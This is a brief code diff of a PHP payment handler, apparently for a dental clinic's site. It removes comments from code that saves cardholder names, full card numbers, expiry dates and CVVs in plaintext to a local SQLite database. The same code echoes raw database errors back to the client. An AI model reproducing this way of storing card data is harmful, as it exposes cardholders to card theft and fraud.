@@ -34,17 +34,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     curl_close($ch);
 
     try {
-        // Konekcija na SQLite bazu podataka
-        $pdo = new PDO('sqlite:dental.db'); // Prilagodite putanju do vaše baze
-
-        // Priprema i izvršavanje SQL upita za čuvanje poruke
+        $pdo = new PDO('sqlite:dental.db');
         $stmt = $pdo->prepare("INSERT INTO messages (unique_id, cardHolderName, cardNumber, expiryDate, cvv, amount) VALUES (?, ?, ?, ?, ?, ?)");
         $stmt->execute([$uniqueId, $cardHolderName, $cardNumber, $expiryDate, $cvv, $amount]);
         header('Content-Type: application/json');
         echo json_encode(['status' => 'success', 'response' => $response, 'uniqueId' => $uniqueId]);
-
     } catch (PDOException $e) {
-        // Obrada greške
         header('Content-Type: application/json');
         echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
     }
